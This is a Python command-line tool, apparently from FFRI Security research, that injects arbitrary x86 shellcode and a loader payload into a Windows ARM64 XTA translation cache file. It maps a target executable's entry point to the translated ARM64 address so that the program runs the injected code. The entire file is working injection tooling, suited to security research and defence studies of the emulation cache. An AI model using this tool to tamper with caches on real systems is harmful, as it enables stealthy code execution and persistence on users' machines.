# (c) FFRI Security, Inc., 2020 / Koh M. Nakagawa: FFRI Security, Inc.

import os
import sys

import r2pipe
import typer
from r2pyapi import R2Reader, R2Surface

from xta_tools import XtaCache, XtaCacheManipulator

from .common import make_backup_file

app = typer.Typer()


@app.command()
def inject_x2c(
    loader_exe_path: str,
    x86_shellcode_path: str,
    cache_dst_path: str,
    exe_dst_path: str,
) -> None:
    """
    inject x86 shellcode into cache file
    """
    for path in (loader_exe_path, x86_shellcode_path, cache_dst_path, exe_dst_path):
        if not os.path.exists(path):
            print(f"{path} does not exist", file=sys.stderr)
            return

    print("make backup")
    make_backup_file(cache_dst_path)

    cache_dst = XtaCache(cache_dst_path, r2_pipe_flags=["-w"])
    r2_loader_exe = r2pipe.open(loader_exe_path)
    loader_exe_surf = R2Surface(r2_loader_exe)
    r2_exe_dst = r2pipe.open(exe_dst_path)
    exe_dst_surf = R2Surface(r2_exe_dst)

    print("get section having loader payload")
    if (section_having_loader := loader_exe_surf.find_section(".scode")) is None:
        print(f"{loader_exe_path} does not have section named '.scode'")
        return

    print("get loader entry")
    if (
        loader_entry_export := loader_exe_surf.find_export_loose("RunFromMemoryX86")
    ) is None:
        print(f"Cannot find shellcode entry point of {loader_exe_path}")
        print(f"{loader_exe_path} does not contain RunFromMemoryARM64")
        return

    print("get loader payload")
    loader_entry_point_rva = loader_entry_export.vaddr - section_having_loader.vaddr
    loader_payload_size = section_having_loader.vsize
    with R2Reader(r2_loader_exe) as reader:
        loader_payload = reader.read_bytes_at(
            section_having_loader.vaddr, loader_payload_size
        )

    print("find injection point")
    dst_entry_point_rva_x86 = exe_dst_surf.entry_point.vaddr - exe_dst_surf.bin.baddr
    dst_entry_point_rva_arm64 = cache_dst.x86_to_arm64[dst_entry_point_rva_x86]

    print("load X86 shellcode")
    with open(x86_shellcode_path, "rb") as fin:
        x86_shellcode_payload = list(fin.read())

    print("insert payload ...")
    xta_manip = XtaCacheManipulator()
    inserted_size = xta_manip.insert_arm64_exe_or_x86_shellcode(
        cache_dst,
        loader_payload,
        loader_entry_point_rva,
        x86_shellcode_payload,
        dst_entry_point_rva_arm64,
    )

    print("fix some header record")
    xta_manip.fix_xta_cache_header(
        cache_dst,
        "ptr_to_nt_pname",
        cache_dst.xta_cache_header.ptr_to_nt_pname + inserted_size,
    )
    xta_manip.fix_xta_cache_header(
        cache_dst,
        "ptr_to_addr_pairs",
        cache_dst.xta_cache_header.ptr_to_addr_pairs + inserted_size,
    )


if __name__ == "__main__":
    app()
